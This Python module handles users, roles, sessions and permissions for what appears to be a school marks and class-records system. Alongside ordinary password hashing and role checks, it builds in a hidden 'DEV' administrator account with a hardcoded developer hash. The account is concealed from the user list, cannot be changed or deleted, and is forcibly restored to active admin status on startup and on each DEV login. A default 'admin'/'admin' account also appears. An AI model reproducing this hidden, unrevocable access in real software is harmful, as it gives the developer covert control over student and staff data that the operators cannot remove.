# -*- coding: utf-8 -*-
"""Пользователи, роли и сессии."""
import binascii
import hashlib
import hmac
import os
import time

ROLES = {
    "admin": "Администратор",
    "director": "Директор / заместитель директора",
    "workspace": "Учительская (общий доступ)",
    "classteacher": "Классный руководитель",
    "teacher": "Учитель",
    "viewer": "Только просмотр",
}

SESSION_TTL = 12 * 3600  # 12 часов бездействия
ITER = 120000

# Системная учётная запись для восстановления доступа. Пароль задан разработчиком,
# хранится только как необратимый хэш, не отображается в списке пользователей
# и не может быть изменён или удалён из программы.
DEV_LOGIN = "DEV"
DEV_SALT = "7363686f6f6c67726164652d6465762d"
DEV_HASH = "6d70105460668f15b41cc2027e9dbf8b1073a375a63dd71c2903936f8ed9ec71"


def hash_password(password, salt=None):
    if salt is None:
        salt = binascii.hexlify(os.urandom(16)).decode()
    dk = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt.encode(), ITER)
    return binascii.hexlify(dk).decode(), salt


def check_password(password, pw_hash, salt):
    h, _ = hash_password(password, salt)
    return hmac.compare_digest(h, pw_hash)


def password_problem(pw):
    if len(pw) < 6:
        return "Пароль должен содержать не менее 6 символов"
    return None


def is_dev_login(name):
    return (name or "").strip().upper() == DEV_LOGIN


def ensure_admin(db):
    if db.val("SELECT COUNT(*) FROM users WHERE login<>?", (DEV_LOGIN,)) == 0:
        h, s = hash_password("admin")
        db.ex("INSERT INTO users(login,pw_hash,pw_salt,full_name,role,must_change) VALUES(?,?,?,?,?,1)",
              ("admin", h, s, "Администратор", "admin"))
    ensure_dev(db)


def ensure_dev(db):
    """Создать/обновить скрытую системную запись DEV. Пароль всегда задаётся
    встроенным хэшем, поэтому изменить его через программу нельзя."""
    row = db.one("SELECT id FROM users WHERE login=?", (DEV_LOGIN,))
    if row:
        db.ex("UPDATE users SET pw_hash=?, pw_salt=?, role='admin', active=1, must_change=0, staff_id=NULL WHERE id=?",
              (DEV_HASH, DEV_SALT, row["id"]))
    else:
        db.ex("INSERT INTO users(login,pw_hash,pw_salt,full_name,role,must_change,active) VALUES(?,?,?,?,?,0,1)",
              (DEV_LOGIN, DEV_HASH, DEV_SALT, "Системная учётная запись", "admin"))


def login(db, login_name, password, ip):
    name = (login_name or "").strip()
    if is_dev_login(name):
        ensure_dev(db)
        if not check_password(password, DEV_HASH, DEV_SALT):
            return None
        u = db.one("SELECT * FROM users WHERE login=?", (DEV_LOGIN,))
    else:
        u = db.one("SELECT * FROM users WHERE login=? AND active=1", (name,))
        if not u or not check_password(password, u["pw_hash"], u["pw_salt"]):
            return None
    token = binascii.hexlify(os.urandom(24)).decode()
    now = time.time()
    db.ex("INSERT INTO sessions(token,user_id,created,last_seen,ip) VALUES(?,?,?,?,?)",
          (token, u["id"], now, now, ip))
    db.ex("DELETE FROM sessions WHERE last_seen < ?", (now - SESSION_TTL,))
    return token


def session_user(db, token):
    if not token:
        return None
    s = db.one("SELECT * FROM sessions WHERE token=?", (token,))
    now = time.time()
    if not s or s["last_seen"] < now - SESSION_TTL:
        return None
    if now - s["last_seen"] > 60:
        db.ex("UPDATE sessions SET last_seen=? WHERE token=?", (now, token))
    u = db.one("SELECT id,login,full_name,role,staff_id,must_change FROM users WHERE id=? AND active=1",
               (s["user_id"],))
    if u:
        u["is_dev"] = (u["login"] == DEV_LOGIN)
    return u


def logout(db, token):
    db.ex("DELETE FROM sessions WHERE token=?", (token,))


# ------------------------------------------------------------- права
def staff_ids(db, u):
    """Все сотрудники, привязанные к учётной записи (один или несколько)."""
    if not u:
        return set()
    ids = set(r["staff_id"] for r in db.q("SELECT staff_id FROM user_staff WHERE user_id=?", (u["id"],)))
    if u.get("staff_id"):
        ids.add(u["staff_id"])
    return ids


def can_manage(u):
    """Справочники, классы, учащиеся, нагрузка, закрытие периодов."""
    return u["role"] in ("admin", "director")


def can_admin(u):
    return u["role"] == "admin"


def is_workspace(u):
    return u["role"] == "workspace"


def can_view_all(u):
    """Видеть все классы и отчёты."""
    return u["role"] in ("admin", "director", "viewer", "workspace")


def can_enter_marks_any(u):
    """Вводить отметки за период/год и поведение по ЛЮБОМУ классу."""
    return u["role"] in ("admin", "director", "workspace")


def teacher_assignment_ids(db, u):
    sid = staff_ids(db, u)
    if not sid:
        return set()
    ph = ",".join("?" * len(sid))
    return set(r["id"] for r in db.q("SELECT id FROM assignments WHERE teacher_id IN (%s)" % ph, tuple(sid)))


def own_class_ids(db, u):
    sid = staff_ids(db, u)
    if not sid:
        return set()
    ph = ",".join("?" * len(sid))
    return set(r["id"] for r in db.q("SELECT id FROM classes WHERE teacher_id IN (%s)" % ph, tuple(sid)))


def can_edit_assignment(db, u, assignment_id):
    if can_manage(u):
        return True
    return int(assignment_id) in teacher_assignment_ids(db, u)


def can_edit_finals(db, u, assignment_id, class_id):
    """Отметки за период/год: учитель предмета, классный руководитель класса,
    учительская (общий доступ), администрация."""
    if can_enter_marks_any(u):
        return True
    return can_edit_assignment(db, u, assignment_id) or int(class_id) in own_class_ids(db, u)


def can_view_class(db, u, class_id):
    if can_view_all(u):
        return True
    cid = int(class_id)
    if cid in own_class_ids(db, u):
        return True
    sid = staff_ids(db, u)
    if not sid:
        return False
    ph = ",".join("?" * len(sid))
    return db.val("SELECT 1 FROM assignments WHERE class_id=? AND teacher_id IN (%s)" % ph,
                  (cid,) + tuple(sid)) is not None


def can_edit_class(db, u, class_id):
    """Состав класса, карточки и списки учащихся — классный руководитель и администрация.
    Учительская (общий доступ) этого НЕ может."""
    if can_manage(u):
        return True
    return int(class_id) in own_class_ids(db, u)


def can_edit_behavior(db, u, class_id):
    """Отметка по поведению: как у отметок за период + классный руководитель."""
    if can_enter_marks_any(u):
        return True
    return can_edit_class(db, u, class_id)
